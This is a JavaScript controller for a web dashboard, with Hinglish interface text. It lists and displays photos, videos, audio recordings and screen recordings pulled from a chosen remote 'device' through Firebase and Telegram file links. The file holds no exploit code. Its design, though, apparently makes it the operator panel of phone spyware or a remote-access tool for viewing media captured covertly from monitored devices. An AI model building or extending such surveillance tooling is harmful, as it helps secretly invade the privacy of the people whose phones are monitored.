// ============================================
// GALLERY CONTROLLER
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('[Gallery] Loaded');

    if (!AUTH.isLoggedIn()) {
        window.location.href = 'index.html';
        return;
    }

    const params = new URLSearchParams(window.location.search);
    let deviceKey = params.get('device') || localStorage.getItem('selectedDevice');

    if (!deviceKey) {
        alert('Koi device select nahi kiya');
        window.location.href = 'dashboard.html';
        return;
    }

    console.log('[Gallery] Device:', deviceKey);

    // State
    let currentTab = 'photos';
    let cache = {
        photos: [],
        videos: [],
        audios: [],
        screens: []
    };

    const contentEl = document.getElementById('galleryContent');
    const toast = document.getElementById('toast');

    // ========== TABS ==========
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            currentTab = tab.dataset.tab;
            renderCurrentTab();
        });
    });

    // ========== HEADER ==========
    document.getElementById('backBtn').addEventListener('click', () => {
        window.location.href = 'dashboard.html';
    });

    document.getElementById('refreshBtn').addEventListener('click', () => {
        location.reload();
    });

    document.getElementById('clearCacheBtn').addEventListener('click', () => {
        if (confirm('Cache clear karein? Ye URLs reset honge.')) {
            Telegram.clearCache();
            showToast('Cache cleared', 'success');
        }
    });

    // ========== FIREBASE LISTENERS ==========
    // Photos
    window.db.ref(`devices/${deviceKey}/photos`).limitToLast(100).on('value', (snap) => {
        cache.photos = toArray(snap.val());
        document.getElementById('countPhotos').textContent = cache.photos.length;
        if (currentTab === 'photos') renderCurrentTab();
    });

    // Videos
    window.db.ref(`devices/${deviceKey}/videos`).limitToLast(50).on('value', (snap) => {
        cache.videos = toArray(snap.val());
        document.getElementById('countVideos').textContent = cache.videos.length;
        if (currentTab === 'videos') renderCurrentTab();
    });

    // Audios
    window.db.ref(`devices/${deviceKey}/audios`).limitToLast(50).on('value', (snap) => {
        cache.audios = toArray(snap.val());
        document.getElementById('countAudios').textContent = cache.audios.length;
        if (currentTab === 'audios') renderCurrentTab();
    });

    // Screen records
    window.db.ref(`devices/${deviceKey}/screenRecords`).limitToLast(50).on('value', (snap) => {
        cache.screens = toArray(snap.val());
        document.getElementById('countScreens').textContent = cache.screens.length;
        if (currentTab === 'screens') renderCurrentTab();
    });

    // ========== RENDER ==========
    function renderCurrentTab() {
        switch (currentTab) {
            case 'photos': renderMediaGrid(cache.photos, 'photo'); break;
            case 'videos': renderMediaGrid(cache.videos, 'video'); break;
            case 'audios': renderAudios(cache.audios); break;
            case 'screens': renderMediaGrid(cache.screens, 'screen'); break;
        }
    }

    function renderMediaGrid(items, type) {
        if (!items || items.length === 0) {
            const labels = {
                photo: { icon: '📸', text: 'Koi photo nahi' },
                video: { icon: '🎥', text: 'Koi video nahi' },
                screen: { icon: '📺', text: 'Koi screen record nahi' }
            };
            const l = labels[type] || labels.photo;
            contentEl.innerHTML = `
                <div class="gallery-empty">
                    <div class="gallery-empty-icon">${l.icon}</div>
                    <div>${l.text}</div>
                </div>
            `;
            return;
        }

        const sorted = items.sort((a, b) => (b.time || 0) - (a.time || 0));

        contentEl.innerHTML = `
            <div class="media-grid">
                ${sorted.map((item, i) => `
                    <div class="media-item" data-idx="${i}" data-file-id="${item.fileId}">
                        <div class="media-item-loader"></div>
                        <div class="media-item-overlay">${timeAgo(item.time)}</div>
                    </div>
                `).join('')}
            </div>
        `;

        // Load thumbnails lazily
        contentEl.querySelectorAll('.media-item').forEach(el => {
            const fileId = el.dataset.fileId;
            const idx = el.dataset.idx;
            const item = sorted[idx];

            loadThumbnail(el, fileId, type, item);
        });
    }

    async function loadThumbnail(el, fileId, type, item) {
        try {
            const url = await Telegram.getFileUrl(fileId);
            if (!url) {
                el.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#9CA3AF;font-size:24px;">❌</div>';
                return;
            }

            const loader = el.querySelector('.media-item-loader');
            if (loader) loader.remove();

            if (type === 'photo' || type === 'screen') {
                const img = document.createElement('img');
                img.src = url;
                img.loading = 'lazy';
                img.alt = 'Media';
                img.style.cssText = 'width:100%;height:100%;object-fit:cover;';
                el.insertBefore(img, el.firstChild);
            } else if (type === 'video') {
                const video = document.createElement('video');
                video.src = url;
                video.muted = true;
                video.preload = 'metadata';
                video.playsInline = true;
                video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
                el.insertBefore(video, el.firstChild);

                // Play icon overlay
                const playIcon = document.createElement('div');
                playIcon.textContent = '▶';
                playIcon.style.cssText = `
                    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
                    color:#fff;font-size:24px;background:rgba(0,0,0,0.5);
                    width:44px;height:44px;border-radius:50%;
                    display:flex;align-items:center;justify-content:center;
                    padding-left:4px;
                `;
                el.appendChild(playIcon);
            }

            // Click handler
            el.addEventListener('click', () => openViewer(url, type, item));
        } catch (e) {
            console.warn('[Gallery] Thumbnail failed', e);
        }
    }

    function renderAudios(audios) {
        contentEl.innerHTML = `<div class="audio-list" id="audioList"></div>`;
        const container = document.getElementById('audioList');

        const sorted = audios.sort((a, b) => (b.time || 0) - (a.time || 0))
            .map(a => ({
                ...a,
                _timeLabel: timeAgo(a.time)
            }));

        AudioPlayer.renderList(container, sorted, { label: 'Recording' });
    }

    // ========== MEDIA VIEWER ==========
    const viewer = document.getElementById('mediaViewer');
    const viewerTitle = document.getElementById('viewerTitle');
    const viewerContent = document.getElementById('viewerContent');
    const viewerDownload = document.getElementById('viewerDownload');
    const viewerClose = document.getElementById('viewerClose');

    function openViewer(url, type, item) {
        viewerTitle.textContent = type === 'photo' ? '📸 Photo' :
                                  type === 'video' ? '🎥 Video' :
                                  type === 'screen' ? '📺 Screen Record' : 'Media';
        viewerDownload.href = url;

        viewerContent.innerHTML = '<div class="viewer-loading"><div class="viewer-loading-icon">⏳</div><div>Loading...</div></div>';

        if (type === 'photo' || type === 'screen') {
            const img = new Image();
            img.onload = () => {
                viewerContent.innerHTML = '';
                viewerContent.appendChild(img);
            };
            img.onerror = () => {
                viewerContent.innerHTML = '<div class="viewer-loading">Load fail</div>';
            };
            img.src = url;
        } else if (type === 'video') {
            const video = document.createElement('video');
            video.src = url;
            video.controls = true;
            video.autoplay = true;
            video.playsInline = true;
            video.style.maxWidth = '100%';
            video.style.maxHeight = '100%';
            viewerContent.innerHTML = '';
            viewerContent.appendChild(video);
        }

        viewer.classList.remove('hidden');
    }

    viewerClose.addEventListener('click', () => {
        viewer.classList.add('hidden');
        viewerContent.innerHTML = '';
    });

    // ESC key to close
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && !viewer.classList.contains('hidden')) {
            viewer.classList.add('hidden');
            viewerContent.innerHTML = '';
        }
    });

    // ========== HELPERS ==========
    function toArray(obj) {
        if (!obj) return [];
        return Object.keys(obj).map(k => ({ id: k, ...obj[k] }))
            .filter(item => item.fileId);
    }

    function showToast(msg, type) {
        toast.textContent = msg;
        toast.className = 'toast ' + (type || 'info');
        toast.classList.remove('hidden');
        clearTimeout(window._toastTimeout);
        window._toastTimeout = setTimeout(() => toast.classList.add('hidden'), 2500);
    }

    // Initial render
    renderCurrentTab();
});
